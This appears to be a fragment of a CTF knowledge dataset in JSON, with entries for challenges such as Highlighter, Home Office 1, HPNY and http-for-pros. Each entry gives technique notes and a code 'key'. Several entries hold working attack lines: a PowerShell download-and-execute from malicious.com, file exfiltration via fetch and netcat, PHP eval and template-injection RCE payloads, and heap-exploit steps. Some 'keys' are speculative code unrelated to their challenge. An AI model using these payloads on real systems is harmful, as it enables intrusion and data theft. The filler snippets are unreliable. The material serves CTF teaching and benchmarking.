            "When analyzing potential HID (Human-Interface-Device) attack vectors, inspect hardware that mimics conventional USB devices. These devices, while appearing innocuous, can function as keyboards to execute malicious commands quickly, leveraging techniques similar to the Rubber Ducky device. Understanding and identifying the encoding method used for such device inputs is crucial for decoding and mitigating the attack.",
            "For decoding encoded keystroke injections, tools like `Duckencoder` for encoding and corresponding decoders (e.g., the `ducky-decode.pl` script for Rubber Ducky payloads) are essential. Incorrect keyboard layouts can result in errors during the decoding process; thus, adjusting the script's replacements or searching through the output for recognizable patterns can aid in extracting meaningful information, such as command and control server URLs or other malicious commands embedded within the payload."
        ],
        "key": "```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nvoid execute_payload() {\n    system(\"powershell -Command \\\"& { (New-Object Net.WebClient).DownloadString('http://malicious.com/payload') | IEX }\\\"\");\n}\n\nint main() {\n    char input[256];\n    printf(\"Enter command: \");\n    gets(input); // Vulnerable to buffer overflow\n    if (strcmp(input, \"run\") == 0) {\n        execute_payload();\n    } else {\n        printf(\"Invalid command\\n\");\n    }\n    return 0;\n}\n```"
    },
    {
        "name": "hide and split 100",
        "write_up": "dataset/raw/hide and split 100.md",
        "type": "This is a **forensics** challenge.",
        "competition": [
            "TCP1P-CTF/2023",
            "https://ctftime.org/event/2001/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When analyzing disk images for hidden data, using tools like `strings` combined with `egrep` can help to extract hexadecimal strings that may not be immediately obvious. This is particularly useful when looking for data hidden within the file system that doesn't conform to standard file entries. For files suspected to be images, especially those starting with known magic numbers (e.g., `89 50 4e` for PNG files), this method can extract the data directly from the disk image without needing to mount or explore the file system interactively. This approach relies on the recognition of file signatures and the assumption that the content of interest is encoded in hexadecimal format accessible through direct string extraction.\n   - Example command: `strings challenge.ntfs | egrep -o '^(?:[0-9a-f]){16,}$'`",
            "For files that have been split and hidden across different parts of a disk image, especially when indicated by file names or contents pointing to this fragmentation (like flag-[number].txt files suggesting the flag is scattered), consolidating all hexadecimal fragments from these split files and converting them back into their original format (e.g., an image) can reveal hidden messages or data. Tools like CyberChef facilitate the conversion from hexadecimal to the file's intended format, enabling the visualization of QR codes or other embedded information within seemingly unrelated or fragmented hex data pieces.\n   - Example process: Concatenate all hexadecimal strings from fragmented files into a single text file, use CyberChef (or a similar tool) to convert from hex to binary or the original file format, revealing the hidden data."
        ],
        "key": "```python\n# Possible vulnerable code snippet based on the context of hidden data in disk images\n\ndef extract_hidden_data(disk_image):\n    with open(disk_image, 'rb') as f:\n        data = f.read()\n    \n    # Assuming hidden data is stored in a specific pattern or offset\n    hidden_data_offset = data.find(b'\\x89\\x50\\x4e')  # Example: PNG magic number\n    if hidden_data_offset != -1:\n        hidden_data = data[hidden_data_offset:hidden_data_offset+1024]  # Arbitrary length\n        return hidden_data\n    return None\n\n# Usage\nhidden_data = extract_hidden_data('challenge.ntfs')\nif hidden_data:\n    with open('extracted_image.png', 'wb') as img_file:\n        img_file.write(hidden_data)\n```\n"
    },
    {
        "name": "Highlighter",
        "write_up": "dataset/raw/Highlighter.md",
        "type": "web",
        "competition": [
            "Defenit/2020",
            "https://ctftime.org/event/1060/tasks/"
        ],
        "score": 857,
        "max_score": 906,
        "difficulty": 0.9459161147902869,
        "knowledge": [
            "When dealing with `static-eval` in a Chrome extension's JavaScript, exploiting prototype pollution is a valid tactic to bypass sandbox restrictions. This can be achieved by overwriting JavaScript native object prototypes, such as `String.split`. This technique allows for the execution of arbitrary code within the constraints of the Chrome extension's permissions.    \n   Example payload to exploit prototype pollution and execute arbitrary code:  \n   ```\n   http://highlighter.ctf.defenit.kr/read?id=84#''['__proto__']['__defineGetter__']('split',function(){return/**/function(x){return/**/{[alert(1)]:1}};});\n   ```",
            "Chrome extensions with permissions over local files (`file://*/*`) can be exploited to read local files without cross-origin restrictions. Initially, identifying the directory structure by fetching `file:///` to receive the root directory listing, followed by targeting specific files, allows for unauthorized access to file contents. This strategy is especially applicable in scenarios where the exact location of sensitive files (like a flag) is unknown prior to exploitation.  \n   Example payload to fetch local files and send their contents to an attacker-controlled server:\n   ```\n   http://highlighter.ctf.defenit.kr/read?id=2#''['__proto__']['__defineGetter__']('split',function(){return/**/function(x){return/**/{[(function(){var/**/r=new/**/XMLHttpRequest();r.open('GET','file:///6339e914b333b35d902a2dfd2c415656/flag',false);r.send();r.responseText;fetch('http://{our server}/'+btoa(r.responseText));})()]:1,'zxcv':'1'}};})\n   ```"
        ],
        "key": "```javascript\n''['__proto__']['__defineGetter__']('split', function() {\n    return function(x) {\n        return {\n            [(function() {\n                var r = new XMLHttpRequest();\n                r.open('GET', 'file:///6339e914b333b35d902a2dfd2c415656/flag', false);\n                r.send();\n                r.responseText;\n                fetch('http://{our server}/' + btoa(r.responseText));\n            })()]: 1,\n            'zxcv': '1'\n        };\n    };\n});\n```"
    },
    {
        "name": "History",
        "write_up": "dataset/raw/History.md",
        "type": "misc",
        "competition": [
            "0xL4ugh/2024",
            "https://ctftime.org/event/2216/tasks/"
        ],
        "score": -1.0,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When dealing with CTF challenges that require identifying subjects through multimedia content or obscure knowledge, an effective strategy is to cross-reference and search for specific elements or details represented in the content across various sources. This can involve using search engines, looking into Wikipedia pages for key details, or employing apps like Shazam to identify music. Additionally, considering alternative names or related concepts not directly provided but linked to the subject (like the *Theseus Maze by Claude Shannon* for Claude Shannon) can lead to the correct answer.",
            "In challenges that involve data extraction from files, such as analyzing archives or documents, using tools like `binwalk` to inspect and extract embedded or hidden content might be instrumental. When dealing with data compiled or stored based on older or specific architecture (like MS-DOS in the example), it's crucial to adjust your data extraction or string search methodologies to match the encoding or structure (e.g., using `-el` with `strings` for 16bits little endian data). This highlights the importance of considering the technical context and file system quirks when approaching data forensics tasks."
        ],
        "key": "```python\ndef validate_input(input_name):\n    valid_names = [\"Theseus\", \"Jobs\", \"Wiesner\", \"Jeff Bezos\", \"Bill Gates\", \"Selfridge\", \"HAL9000\"]\n    if input_name in valid_names:\n        return \"Valid\"\n    else:\n        return \"Invalid\"\n\n# Example usage\nuser_input = \"Shannon\"\nresult = validate_input(user_input)\nprint(result)  # Output: Invalid\n```\n"
    },
    {
        "name": "Hmmm",
        "write_up": "dataset/raw/Hmmm.md",
        "type": "misc",
        "competition": [
            "HexionCTF/2020",
            "https://ctftime.org/event/1014/tasks/"
        ],
        "score": 453,
        "max_score": 998,
        "difficulty": 0.45390781563126253,
        "knowledge": [
            "When analyzing an ELF binary that does not exhibit any useful strings or does not seem to behave as expected when executed, it is important to inspect the binary at a byte level using tools like `hexdump` (hd) or `xxd`. This technique can reveal hidden data, such as flags, that may be obfuscated by non-printable characters such as NULL bytes inserted between the visible characters of the data.",
            "In scenarios where a binary file's behavior or output does not directly reveal clues towards solving a challenge, consider alternative methods of interactively examining the file's contents, such as using `cat` or examining the file's structure with file manipulation tools. This approach can unexpectedly expose embedded data or clues that were not apparent through dynamic analysis or disassembly. It's particularly useful when the flag or other critical data is stored in a non-standard format or is cleverly concealed within the binary's data sections."
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nint main() {\n    char flag[] = \"h\\0\\0\\0\\0\\0\\0\\0e\\0\\0\\0\\0\\0\\0\\0x\\0\\0\\0\\0\\0\\0\\0C\\0\\0\\0\\0\\0\\0\\0T\\0\\0\\0\\0\\0\\0\\0F\\0\\0\\0\\0\\0\\0\\0{\\0\\0\\0\\0\\0\\0\\0\"\n                  \"1\\0\\0\\0\\0\\0\\0\\0m\\0\\0\\0\\0\\0\\0\\0_\\0\\0\\0\\0\\0\\0\\0s\\0\\0\\0\\0\\0\\0\\0o\\0\\0\\0\\0\\0\\0\\0r\\0\\0\\0\\0\\0\\0\\0r\\0\\0\\0\\0\\0\\0\\0\"\n                  \"y\\0\\0\\0\\0\\0\\0\\0_1f_y0u_r3v3r5ed_7h1s}\";\n    printf(\"%s\\n\", flag);\n    return 0;\n}\n```"
    },
    {
        "name": "Hobbit",
        "write_up": "dataset/raw/Hobbit.md",
        "type": "forensics",
        "competition": [
            "zer0pts/2020",
            "https://ctftime.org/event/1006/tasks/"
        ],
        "score": 525,
        "max_score": 755,
        "difficulty": 0.695364238410596,
        "knowledge": [
            "When reversing kernel modules or binaries proves to be too challenging or inaccessible due to environment constraints, consider utilizing memory dumping techniques. Running the target software in an emulated environment like QEMU and then dumping the memory with tools such as `gcore` can transition the challenge from reverse engineering to a forensics task. This approach allows for analysis of the program's runtime data, which can be particularly beneficial when direct debugging or code analysis is complicated or impractical.",
            "For Capture The Flag challenges where the flag is known to be loaded into memory at some point during execution, and if the binary or the execution environment outputs identifiable strings related to the flag, memory dump analysis can be extremely effective. After obtaining a memory dump, one can utilize string search tools or commands (e.g., grep) to find unique identifiers like \"FLAG:\" within the dump. This method can reveal the flag or critical parts of the binary or data that are being manipulated at runtime without needing to fully understand or reverse-engineer the program's logic.\n   - Example command to search in memory dump: `grep 'FLAG:' memdump.bin`"
        ],
        "key": "```c\nvoid The_Load_of_the_Rings(char *binary) {\n    wear_ring(binary);\n}\n\nvoid wear_ring(char *data) {\n    pickup(data);\n    adjust(data);\n}\n\nvoid pickup(char *data) {\n    for (int i = 0; i < DATA_SIZE; i++) {\n        data[i] ^= 0xAA; // XOR operation with a constant\n    }\n}\n\nvoid adjust(char *data) {\n    for (int i = 0; i < DATA_SIZE; i++) {\n        data[i] ^= 0x55; // Another XOR operation with a different constant\n    }\n}\n```"
    },
    {
        "name": "Holy graal",
        "write_up": "dataset/raw/Holy graal.md",
        "type": "This challenge falls under the category of **web** CTF challenges.",
        "competition": [
            "Hackover/2018",
            "https://ctftime.org/event/689/tasks/"
        ],
        "score": 477,
        "max_score": 500,
        "difficulty": 0.954,
        "knowledge": [
            "When dealing with languages or platforms that incorporate a `read-string` function or similar (like Clojure in this example), it's crucial to recognize that this functionality can execute arbitrary code provided as input if *read-eval* is not securely configured. A security practice to mitigate such risks is ensuring that *read-eval* is disabled or the input is thoroughly sanitized before being evaluated. If exploitation is necessary (e.g., in a CTF scenario), one can craft payloads that exploit this behavior to execute arbitrary commands.  \nExample payload: `#=(println #=(clojure.java.shell/sh \"ls\"))`",
            "In scenarios where a service or application exposes functionality to execute shell commands indirectly (e.g., through unsafe deserialization or insecure evaluation of inputs), payloads can be crafted to escape the intended input domain and perform arbitrary command execution. This is particularly applicable when input is passed to functions or methods that evaluate the string as code without proper input validation checks. Crafting such payloads requires understanding of the underlying processing mechanism and how it can be manipulated to achieve code execution.  \nExample payload for command execution via unsafe input evaluation in Clojure: `#=(clojure.java.shell/sh \"cat\" \"flag.txt\")`"
        ],
        "key": "```clojure\n(defmethod option \"1\" [_]  \n (try  \n   (-> (read-line)  \n       (read-string))  \n   (println \"Good job, you know how to balance brackets. Now go, get the\nflag.\")  \n   (catch Exception e  \n     (println \"You need to work on your balancing skills.\"))))\n```"
    },
    {
        "name": "Home Office 1",
        "write_up": "dataset/raw/Home Office 1.md",
        "type": "This write-up describes a challenge involving gaining access to a flag file by exploring the filesystem of a Docker container and leveraging a race condition to execute a specific script as an admin user. This challenge falls under the category of **forensics** as it involves analyzing filesystem artifacts and log files to uncover privileged information and manipulate the system to obtain the flag.",
        "competition": [
            "Dragon/2020",
            "https://ctftime.org/event/1082/tasks/"
        ],
        "score": 287,
        "max_score": 500,
        "difficulty": 0.574,
        "knowledge": [
            "When exploiting vulnerabilities in a script executed with elevated privileges, look for ways to control or overwrite scripts or files that the privileged script will execute. This allows for arbitrary command execution with elevated privileges. A common scenario is when a software installation or administrative script executes other scripts as a part of its process. Modifying these scripts before they're executed by the elevated process can lead to gaining access or extracting information that wouldn't be otherwise accessible.",
            "To handle race conditions where an exploited script or file may be overwritten by the system or another process, continuously write or copy your payload into the target file in a loop. This ensures that your payload will be in the target file when it is executed despite any overwrites. This technique is particularly useful when dealing with installation scripts or automated processes that may overwrite your modifications, and there is uncertainty about the precise timing of execution.\n\nExample payload:\n```\ntouch /tmp/mime.sh\nchmod 777\n\n/bin/cat <<EOF >/tmp/mymime.sh\ncat /home/admin/data/flag.prdx | nc myserver.de 12345\n\nEOF\n\nwhile true;\ndo\n    cp /tmp/mymime.sh /tmp/mime.sh\ndone\n```"
        ],
        "key": "```bash\ntouch /tmp/mime.sh  \nchmod 777  \n  \n/bin/cat <<EOF >/tmp/mymime.sh  \ncat /home/admin/data/flag.prdx | nc myserver.de 12345  \n  \nEOF  \n  \nwhile true;  \ndo  \n    cp /tmp/mymime.sh /tmp/mime.sh  \ndone  \n```"
    },
    {
        "name": "House of Sus",
        "write_up": "dataset/raw/House of Sus.md",
        "type": "pwn",
        "competition": [
            "Sunshine/2023",
            "https://ctftime.org/event/2079/tasks/"
        ],
        "score": 450,
        "max_score": 450,
        "difficulty": 1.0,
        "knowledge": [
            "In challenges involving heap exploitation, specifically when dealing with unbounded allocations, the \"house-of-force\" technique can be used to gain arbitrary writes. This is achieved by manipulating the top chunk size to a large value, allowing the next malloc call to \"wrap around\" the heap and overwrite arbitrary memory locations. This method is particularly useful for overwriting GOT entries or function pointers such as `free` with addresses pointing to desired payloads, such as one_gadgets or a win function.   \nExample payload step:  \n   - Overwrite top chunk size: `create_chunk(b\"32\", (b\"A\" * 40) + pwn.p64(0xFFFFFFFFFFFFFFFF))`\n   - Calculate distance to target address and write filler data up to the point just before the target: `create_chunk(str(wrap_distance).encode(), b\"BBBBBBBB\")`\n   - Overwrite target (e.g., GOT entry): `create_chunk(b\"128\", 5 * (pwn.p64(elf.got['free'])))`",
            "To achieve a successful libc leak in memory corruption vulnerabilities, overwrite a GOT entry or a function pointer in writable memory with a known libc address. After executing a call to the overwritten GOT entry or function pointer, it will leak the libc address, enabling calculation of the libc base address and access to system, one_gadgets, or other libc functions. This is crucial for bypassing ASLR (Address Space Layout Randomization) in remote attacks, where the libc version might be known but its base address is randomized.\nExample process for libc leak:  \n   - Create a chunk that will overwrite a known pointer (e.g., GOT of `free`) with the address to leak: `create_chunk(b\"128\", 5 * (pwn.p64(elf.got['free'])))`\n   - Trigger the overwritten function pointer or GOT entry to print out the leaked address: `p.recv(6).ljust(8, b\"\\x00\")`  \n   - Calculate libc base address from leaked address: `libc.address = free_leak - libc.sym['free']`"
        ],
        "key": "```c\nvoid *top_chunk = ...; // Assume this is the top chunk pointer\nsize_t *top_chunk_size = (size_t *)((char *)top_chunk - sizeof(size_t));\n\n// Vulnerability: Setting top chunk size to a very large value\n*top_chunk_size = 0xFFFFFFFFFFFFFFFF;\n\n// Vulnerability: Arbitrary write due to incorrect size calculation\nvoid *target_address = ...; // Assume this is calculated to wrap around\nsize_t wrap_distance = 0xFFFFFFFFFFFFFFFF - (size_t)target_address + (size_t)some_object;\nmalloc(wrap_distance);\n```"
    },
    {
        "name": "House of Sweets And Selfies",
        "write_up": "dataset/raw/House of Sweets And Selfies.md",
        "type": "reverse",
        "competition": [
            "SpamAndFlags/2020/Quals",
            "https://ctftime.org/event/970/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting a heap overflow vulnerability, specifically in challenges involving memory management libraries such as jemalloc, one can manipulate the tcache (thread cache) entries to gain arbitrary control over memory allocations and deallocations. This can be achieved by carefully crafting inputs to cause an overflow that modifies the metadata of adjacent tcache entries, such as the `ncached` value and the `avail` pointer within a `tcache_bin_s` structure. This manipulation enables control over the addresses returned by subsequent `malloc` calls, or the destinations of pointers freed by `free` calls, facilitating leaks of memory addresses or even arbitrary code execution.",
            "In scenarios where a binary allows for the creation and modification of data structures (such as 'cakes' in the provided example) with both controlled size and content, heap-based attacks can be strategized to leak important addresses (heap, libc, stack) and eventually execute arbitrary code. This requires a deep understanding of the binary's allocation patterns and the underlying allocator's behavior (jemalloc in this context). The steps typically involve: a) causing a controlled overflow to overwrite metadata in a manner that `malloc` or `free` encounters altered `tcache` structures; b) crafting subsequent allocations or deallocations to write or leak addresses from controlled or known positions; c) utilizing leaks to calculate offsets for critical structures or functions (like `environ` for stack leaks, or known libc addresses for libc leaks); d) and finally, crafting payloads that overwrite return addresses or function pointers to hijack execution flow, such as overwriting a return address with the location of a 'one gadget' for shell execution."
        ],
        "key": "```c\ntypedef struct tcache_bin_s tcache_bin_t;\n\nstruct tcache_bin_s {  \n   tcache_bin_stats_t tstats;  \n   int     low_water;  /* Min # cached since last GC. */  \n   unsigned    lg_fill_div;    /* Fill (ncached_max >> lg_fill_div). */  \n   unsigned    ncached;    /* # of cached objects. */  \n   /*  \n    * To make use of adjacent cacheline prefetch, the items in the avail  \n    * stack goes to higher address for newer allocations.  avail points  \n    * just above the available space, which means that  \n    * avail[-ncached, ... -1] are available items and the lowest item will  \n    * be allocated first.  \n    */  \n   void        **avail;    /* Stack of available objects. */  \n};\n\nstruct tcache_s {  \n   ql_elm(tcache_t) link;      /* Used for aggregating stats. */  \n   uint64_t    prof_accumbytes;/* Cleared after arena_prof_accum(). */  \n   ticker_t    gc_ticker;  /* Drives incremental GC. */  \n   szind_t     next_gc_bin;    /* Next bin to GC. */  \n   tcache_bin_t    tbins[1];   /* Dynamically sized. */  \n   /*  \n    * The pointer stacks associated with tbins follow as a contiguous  \n    * array.  During tcache initialization, the avail pointer in each  \n    * element of tbins is initialized to point to the proper offset within  \n    * this array.  \n    */  \n};  \n```"
    },
    {
        "name": "How to Breakdance",
        "write_up": "dataset/raw/How to Breakdance.md",
        "type": "This is a **forensics** challenge.",
        "competition": [
            "UMDCTF/2022",
            "https://ctftime.org/event/1593/tasks/"
        ],
        "score": -1,
        "max_score": 987,
        "difficulty": -1,
        "knowledge": [
            "When analyzing USB keyboard packet capture (pcapng) files in Capture The Flag (CTF) challenges, utilize specialized tools like `ctf-usb-keyboard-parser` to decode the keypresses from the USB capdata. This process reveals meaningful data such as passwords, URLs, and typed messages, which can be critical for solving the challenge.",
            "In challenges involving USB data capture, apply `tshark` to filter and extract the hex-encoded USB capdata related to keyboard input by focusing on packets where `usb.data_len == 8`. Then, preprocess this data by inserting colons between bytes using `sed`, making it compatible with keyboard data parsing tools. This step is pivotal for transforming raw USB capture data into a human-readable format for further analysis.\n   \n   Example command sequence:\n   - Extract and format keyboard data: `tshark -r <file.pcapng> -Y 'usb.capdata && usb.data_len == 8' -T fields -e usb.capdata | sed 's/../:&/g2' > formatted_keydata`\n   - Decode extracted data: `python usbkeyboard.py formatted_keydata`"
        ],
        "key": "```python\n# Possible vulnerable code snippet for USB keyboard data parsing\n\ndef parse_usb_data(data):\n    # Assuming data is a list of USB packets\n    for packet in data:\n        if len(packet) == 8:  # Vulnerable check for USB data length\n            process_packet(packet)\n\ndef process_packet(packet):\n    # Process the packet data\n    # Potential vulnerability: No validation or sanitization of packet data\n    print(\"Processing packet:\", packet)\n\n# Example usage\nusb_data = [\n    b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00',  # Example USB packet\n    b'\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08'\n]\n\nparse_usb_data(usb_data)\n```"
    },
    {
        "name": "How to Get Started",
        "write_up": "dataset/raw/How to Get Started.md",
        "type": "pwn",
        "competition": [
            "UIUCTF/2020",
            "https://ctftime.org/event/1075/tasks/"
        ],
        "score": -1,
        "max_score": 666,
        "difficulty": -1,
        "knowledge": [
            "When encountering encoded or encrypted strings in CTF challenges, it's important to consider common encoding schemes or ciphers based on the composition of the string (for example, if it consists of letters and numbers, base64 could be a possibility). However, without explicit hints, this approach might not always yield the correct results. For instance, decoding a string that appears to be base64 encoded without proper context or understanding of the encoding scheme used may lead to incorrect interpretations or output unprintable characters. This process reinforces the importance of not relying solely on the string's appearance but also considering the context and any available hints to determine the correct decoding method.",
            "In CTF challenges that involve exploring websites or documents for flags, it's crucial to thoroughly inspect all available resources. This includes not just the obvious content but also looking for subtle hints or hidden elements. For example, exploring version control history, such as using the sliding version history feature on GitHub, can reveal hidden hints or information that is not visible in the latest version of the content. This approach of paying close attention to document changes over time or hidden elements within the page can uncover clues leading to the flag. Additionally, the challenge underscores the importance of reading documentation or provided resources carefully, as hints or flags may be embedded within seemingly mundane or overlooked details."
        ],
        "key": "```python\nflag = \"\"  \nfor c in range(len(\"d8f1328d\")):  \n    flag += chr(ord(\"d8f1328d\"[c]) + ord(\"pwnyOSpwnyOS\"[c % 6]))  \nprint(flag)\n```"
    },
    {
        "name": "HPNY",
        "write_up": "dataset/raw/HPNY.md",
        "type": "web",
        "competition": [
            "TetCTF/2021",
            "https://ctftime.org/event/1213/tasks/"
        ],
        "score": 100,
        "max_score": 995,
        "difficulty": 0.10050251256281408,
        "knowledge": [
            "When faced with strict input validation that limits the characters and length of payloads for executing PHP code, consider utilizing HTTP headers to deliver the payload. This approach gets around input restrictions by embedding the malicious code in headers, which are not subject to the same validation. Payload delivery through headers can be effective in scenarios where the application uses or can be tricked into using header values within an eval function or similar dynamic code execution contexts.\n\n    Sample payload delivery using User-Agent header:\n    ```\n    User-Agent: eval(system('cat /path/to/flag/file'))\n    ```",
            "To execute PHP code embedded in HTTP headers, leverage PHP's `getallheaders()` function to retrieve all request headers as an array, and then use `implode()` to convert this array into a single string that contains all header values concatenated together. This string can then be passed to the `eval()` function for execution. To prevent syntax errors or unintended code execution due to additional contents in headers, encapsulate the payload in PHP comment syntax (`/* ... */`) and strategically place start (`/*`) and end (`*/`) comment tokens in separate custom headers to ensure only the intended code is executed.\n\n    Final exploit request format incorporating comments to isolate the payload:\n    ```\n    GET /?roll=(eval(implode(getallheaders()))) HTTP/1.1\n    Custom-Header-Start: /*\n    ...\n    User-Agent: */ eval(system('cat /path/to/flag/file'));/*\n    ...\n    Custom-Header-End: */\n    ```"
        ],
        "key": "```php\n<?php\n\nfunction get_lucky_word() {\n    $words = array(\"Chuc mung nam moi\", \"gongxifacai\", \"happy new year!\", \"bonne ann\u00e9e\", \"Akemashite omedeto gozaimasu\", \"Seh heh bok mahn ee bahd euh sae yo\", \"kimochi\", \"Feliz A\u00f1o Nuevo\", \"S novim godom\", \"Gelukkig Nieuwjaar\", \"selamat tahun baru\", \"iniya puthandu nal Vazhthukkal\");\n    return $words[array_rand($words)];\n}\n\nfunction get_lucky_number() {\n    $numb = rand(0,100);\n    return strval($numb);\n}\n\n\nif(!isset($_GET[\"roll\"])) {\n    show_source(__FILE__);\n}\nelse\n{\n    $wl = preg_match('/^[a-z\\(\\)\\_\\.]+$/i', $_GET[\"roll\"]);\n\n    if($wl === 0 || strlen($_GET[\"roll\"]) > 50) {\n        die(\"bumbadum badum\");\n    }\n    eval(\"echo \".$_GET[\"roll\"].\"();\");\n}\n\n?>\n```"
    },
    {
        "name": "http-for-pros",
        "write_up": "dataset/raw/http-for-pros.md",
        "type": "web",
        "competition": [
            "Defcamp/2020",
            "https://ctftime.org/event/1182/tasks/"
        ],
        "score": 200,
        "max_score": 972,
        "difficulty": 0.205761316872428,
        "knowledge": [
            "When encountering a web application that reflects user input and certain characters are blacklisted, indicating a potential template injection vulnerability, bypassing character blacklists is crucial. Utilizing an array-like accessor `[ ]` instead of the dot notation `.` can be a viable workaround for accessing object attributes. This can be particularly effective when direct attribute access is blocked, for example, bypassing the restriction on accessing `__class__` by using request parameters or cookies to reference the required attribute indirectly. An example of such bypass could be setting a cookie or parameter with the value `__class__` and then referencing it like `request[request.cookies['a']]` in case dot notation or underscores are restricted.",
            "In scenarios where an application is vulnerable to template injection, and direct execution of functions like `__import__` is blocked, constructing a gadget chain that leverages the application's own attributes and functions is a powerful technique for achieving remote code execution (RCE). By chaining attributes and methods such as `request._get_file_stream.im_func.func_globals['__builtins__']['__import__']`, one can dynamically import modules and execute functions, including those that allow command execution, such as `subprocess.check_output`. This is particularly useful in environments where WAFs or other security measures restrict traditional payloads. An example payload to execute system commands via template injection, using cookies to bypass blacklists and construct the gadget chain, is as follows: `{{request[request.cookies['a']][request.cookies['b']][request.cookies['c']][request.cookies['d']][request.cookies['e']][request.cookies['f']]('subprocess')[request.cookies['g']](request.cookies['h'], shell=True)}}`. This payload dynamically constructs a call to `subprocess.check_output` with the command contained in a cookie, enabling arbitrary command execution within the constraints of the server's permissions."
        ],
        "key": "```python\nparams = {  \n    \"content\": \"{{request[request.cookies['a']][request.cookies['b']][request.cookies['c']][request.cookies['d']][request.cookies['e']][request.cookies['f']]('subprocess')[request.cookies['g']](request.cookies['h'],shell=True)}}\"  \n}  \ncookies = {  \n    \"a\": \"__class__\",  \n    \"b\": \"_get_file_stream\",  \n    \"c\": \"im_func\",  \n    \"d\": \"func_globals\",  \n    \"e\": \"__builtins__\",  \n    \"f\": \"__import__\",  \n    \"g\": \"check_output\",  \n    \"h\": cmd  \n}  \n```"
    },
    {
        "name": "Hunting into the wild",
        "write_up": "dataset/raw/Hunting into the wild.md",
        "type": "forensics",
        "competition": [
            "Defcamp/2020",
            "https://ctftime.org/event/1182/tasks/"
        ],
        "score": 972,
        "max_score": 972,
        "difficulty": 1.0,
        "knowledge": [
            "When investigating incidents within Windows environments that involve potential credential dumping or malware activity, searching through log data (e.g., by using tools like ELK stack for log management) can be crucial. Specifically, look for evidence of known hacking tools or scripts by their process names, command-line arguments, or file access patterns. Knowledge of popular hacking tool syntax, such as `sekurlsa::LogonPasswords` for Mimikatz, can guide the search. Example search query: `\"sekurlsa::LogonPasswords\" OR \"mim.exe\"`.",
            "Identifying the initiation of malware downloads or suspicious command execution in a compromised Windows environment can often be achieved by examining command-line execution logs for specific patterns, such as the use of native Windows utilities in unconventional ways. For example, `certutil.exe` with `-urlcache`, `-split`, and `-f` flags downloading files from the internet can be indicative of a malicious operation. This highlights the importance of monitoring for abuse of built-in utilities like `certutil`, which can be utilized for file download or malware staging. Example search query to identify malicious file download: `certutil.exe -urlcache -split -f URL FILEPATH`."
        ],
        "key": "```  \nC:\\TMP\\mim.exe sekurlsa::LogonPasswords > C:\\TMP\\o.txt  \n```\n\n```  \ncertutil.exe  -urlcache -split -f\nhttps://raw.githubusercontent.com/NextronSystems/APTSimulator/master/download/cactus.js\nC:\\Users\\Public\\en-US.js  \n```\n\n```  \nC:\\Windows\\system32\\cmd.exe /c\n\"\"\"\"C:\\Users\\IEUser\\Desktop\\APTSimulator\\APTSimulator.bat  \n```\n\n```  \nnet user guest /active:yes  \n```"
    },
    {
        "name": "I have a dream",
        "write_up": "dataset/raw/I have a dream.md",
        "type": "misc",
        "competition": [
            "Tenable/2021",
            "https://ctftime.org/event/1266/tasks/"
        ],
        "score": 100,
        "max_score": 250,
        "difficulty": 0.4,
        "knowledge": [
            "When faced with a binary file and a hint that suggests the content may be derived from historical or well-known text, consider the possibility of XOR encryption. The initial step involves using a known plaintext attack where a segment of the presumed plaintext is XORed with a portion of the ciphertext. This helps in identifying the XOR key. An example in Python for calculating the XOR key can be structured as follows:  \n```python\nfrom pwn import xor\nknown_plaintext = b\"Known segment of text\"  \nciphertext = open(\"encrypted_file.dat\", \"rb\").read()  \nxor_key = xor(known_plaintext, ciphertext[:len(known_plaintext)])  \nprint(xor_key)\n```",
            "Once the XOR key is identified, it can be used to decrypt the entire ciphertext. If decoding the XOR result leads to unintelligible characters, it might be beneficial to attempt decoding it using different character encodings until readable text is obtained. Additionally, it may be necessary to manipulate the decoded text, such as removing newlines, to extract the final information correctly. The Python code snippet for decrypting the ciphertext and adjusting the decoding parameters is as follows:\n```python\ndecrypted_text = xor(ciphertext, xor_key).decode(\"chosen_character_encoding\").replace(\"unwanted_character\", \"replacement_character\")  \n```\n\nThese steps demonstrate a practical approach to address challenges involving XOR encryption and the importance of selecting appropriate character encodings for decoding the decrypted plaintext."
        ],
        "key": "```python\nplaintext = b\"I am happy to join with you today in what will go down in history\"\nciphertext = open(\"speech.dat\", \"rb\").read()\nxor(plaintext, ciphertext[:len(plaintext)])\n```"
    },
    {
        "name": "I'm so random",
        "write_up": "dataset/raw/I'm so random.md",
        "type": "crypto",
        "competition": [
            "angstrom/2021",
            "https://ctftime.org/event/1265/tasks/"
        ],
        "score": 100,
        "max_score": 300,
        "difficulty": 0.3333333333333333,
        "knowledge": [
            "When encountering a PRNG (Pseudo-Random Number Generator) in a CTF challenge, specifically one based on the middle square method, it's possible to reverse-engineer future outputs by factoring a given output into its components, assuming it's the result of multiplying two numbers generated by similar PRNGs. This approach bypasses the need to directly crack the PRNG's algorithm or seed values. This is particularly applicable in scenarios where the PRNG's operation and outputs are partially observable or interactable through a challenge interface.",
            "For effectively decomposing a product of two numbers back into its original factors under the constraint of a CTF challenge, leveraging mathematical libraries or frameworks capable of enumerating divisors, such as SageMath, can be invaluable. This method relies on the assumption that given numbers are products of two relatively large factors, which can be iteratively tested to find a matching pair that reproduces subsequent outputs when processed the same way as the PRNG does.\n\nSample Code Snippet:\n```python\nfrom sage.all import divisors  # Importing divisors function from SageMath library\n\ndef find_r(x, y):  \n   d = divisors(x)  \n   for r1 in d:  \n       if not valid(r1):  # Assuming a validity check function exists\n           continue  \n       r2 = x // r1  \n       if not valid(r2):  \n           continue  \n  \n       g1 = Generator(r1)  # Assuming a similar PRNG implementation is available\n       g2 = Generator(r2)  \n       o = g1.getNum() * g2.getNum()  \n       if o == y:  # Comparing the product of generated numbers to the next output from the server\n           return (r1, r2)  \n\n   raise Exception('Divisors not found')\n```"
        ],
